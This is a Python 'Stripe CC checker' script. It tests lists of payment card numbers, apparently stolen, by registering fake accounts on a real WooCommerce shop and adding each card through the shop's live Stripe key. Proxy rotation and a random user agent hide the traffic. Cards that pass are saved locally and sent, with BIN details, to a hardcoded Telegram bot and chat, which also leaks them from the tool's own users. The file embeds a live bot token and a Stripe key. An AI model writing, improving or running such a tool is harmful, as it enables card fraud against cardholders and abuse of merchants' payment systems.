import requests
import random
import time
import os
import sys
import user_agent
from colorama import Fore

#---------[COLORS]--------#
Z =  '\033[91m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
OKBLUE = '\033[94m'
WARNING = '\033[93m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
LIME = '\033[38;5;10m'
W=Fore.WHITE
L=Fore.BLUE

#----------LOGO-------------#
logo = ("""
\033[38;2;173;216;230m ########  ########     ###     ######    #######  ##    ## 
\033[38;2;255;160;122m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
\033[38;2;144;238;144m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
\033[38;2;255;69;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
\033[38;2;30;144;255m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
\033[38;2;238;130;238m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
\033[38;2;255;215;0m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
\x1b[1;95m┏───────────────────────────────────────────────┓
\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mNIGHT STALKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mNull🔥
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219mNIGHT-STALKER-666
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mSTRIPE CC CHECKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m1.0
\x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A STRIPE CHECKER\033[;0m\033[1;91m\033[1;92m
\x1b[1;95m┗───────────────────────────────────────────────┛
""")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)

def linex():
    print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")

def typewriter(text, speed=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def bin_lookup(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        bank_name = data.get('bank', 'N/A')
        country_name = data.get('country_name', 'N/A')
        country_flag = data.get('country_flag', '')
        scheme = data.get('brand', 'N/A')
        card_type = data.get('type', 'N/A')
        level = data.get('level', 'N/A')

        result = (
            f"★ 𝗜𝗻𝗳𝗼 ➜ {scheme.upper()} - {card_type.upper()} - {level.upper()}\n"
            f"★ 𝐁𝐚𝐧𝐤 ➜ {bank_name.upper()}\n"
            f"★ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_name.upper()} {country_flag}"
        )
        return result
    else:
        return "★ [✘] BIN lookup failed."

def save_valid_card(ccx):
    with open("valid_cards.txt", "a") as file:
        file.write(f"{ccx}\n")

def get_telegram_username(user_id, bot_token):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
        response = requests.get(url)
        data = response.json()
        
        if response.status_code == 200 and "result" in data:
            username = data["result"].get("username", None)
            if username:
                return f"@{username}"
            else:
                return f"User ID: {user_id}"
        else:
            return f"User ID: {user_id}"
    except Exception as e:
        return f"User ID: {user_id}"

def send_to_telegram(ccx, result, bin_code, elapsed_time, user_id):
    bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
    channel_id = "-1002317552901"
    user_idi = "1344144034"
    bin_result = bin_lookup(bin_code)
    username = get_telegram_username(user_id, bot_token)
    message = f"""
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

💳 𝗖𝗮𝗿𝗱 ➜ {ccx}
➤ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ Stripe Auth [Terminal]
★ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ ⤿ {result} ⤾

{bin_result}

⟳ 𝗧𝗶𝗺𝗲 ➜ {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
⤷ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {username} [ PREMIUM ]
"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": user_idi,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=payload)

def create_payment_method(fullz):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "drganjdiw" + str(random.randint(9999, 574545))
        mail = user + "@gmail.com"
        user = user_agent.generate_user_agent()
        session = requests.Session()
        headers = {
            'user-agent': user,
        }

        response = session.get('https://fixmemobile.com/my-account-2/', headers=headers)
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        data = {
            'email': mail,
            'password': 'hdnnbkxNCH6yDna',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }
        session.post('https://fixmemobile.com/my-account-2/', headers=headers, data=data)
        response = session.get('https://fixmemobile.com/my-account-2/payment-methods/', headers=headers)
        response = session.get('https://fixmemobile.com/my-account-2/add-payment-method/', headers=headers)
        payment_nonce = gets(response.text, '"add_card_nonce":"', '"')
        data = {
            'type': 'card',
            'billing_details[name]': '',
            'billing_details[email]': mail,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': str(random.randint(100000, 999999)),
            'key': 'pk_live_51NaddyLBcKK5IM53aEKl8NjeG0XkXL2lJcj7yMh04Dogx0IIm2Vo6poN6KKuJyWRMbleatB6tg62yJAo6DMwoe4k00c0CAP14L',
        }
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        payment_response = response.json()
        if "id" in payment_response:
            stripe_id = payment_response["id"]
        else:
            return "Payment method creation failed"

        params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
        data = {'stripe_source_id': stripe_id, 'nonce': payment_nonce}

        response = session.post('https://fixmemobile.com/', params=params, headers=headers, data=data)
        if response.status_code == 200:
            response_json = response.json()
            if response_json.get("status") == "success":
                result = "successfully added ✅"
                return result
            else:
                error_message = response_json.get("error", {}).get("message", "Unknown error")
                return f"Payment failed: {error_message} ❌"
        else:
            return "Error occurred during payment method creation ❌"

    except Exception as e:
        return f"Error: {str(e)} ❌"

def multi_checking(cc_info, user_id):
    start_time = time.time()
    proxy_file = os.path.join(os.getcwd(), "proxy.txt")
    proxies = None
    
    try:
        with open(proxy_file, "r", encoding="utf-8") as file:
            proxies_list = file.read().splitlines()
        getproxy = random.choice(proxies_list)
        
        try:
            proxy_ip, proxy_port, proxy_user, proxy_password = getproxy.split(":")
            proxies = {
                "http": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
                "https": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
            }
        except ValueError:
            proxies = None 
    except FileNotFoundError:
        proxies = None 

    result = create_payment_method(cc_info)
    elapsed_time = round(time.time() - start_time, 2)
    
    response_msg = f"Card: {cc_info} - Response: {result}"
    print(response_msg)
    if 'success' in result.lower():
        save_valid_card(cc_info)
        bin_code = cc_info.split("|")[0][:6]  
        send_to_telegram(cc_info, result, bin_code, elapsed_time, user_id)  

def main():
    clear()
    typewriter("GO TO B3 DROPPER BOT AND CLICK ON START. ELSE WAIT, CODE WILL REDIRECT YOU 🤝", speed=0.05)
    time.sleep(5)
    os.system('xdg-open https://t.me/b3ccdrop_bot')
    clear()

    user_id = input(Fore.YELLOW + "Please enter your Telegram user ID: " + Fore.RESET)
    cc_file = input(Fore.YELLOW + "CC FILE PATH: " + Fore.RESET)
    
    try:
        with open(cc_file, "r", encoding="utf-8") as file:
            ccs = file.read().splitlines()
        
        for cc_info in ccs:
            multi_checking(cc_info, user_id)
    
    except FileNotFoundError:
        print(f"Error: '{cc_file}' file not found in the current directory.")

if __name__ == "__main__":
    main()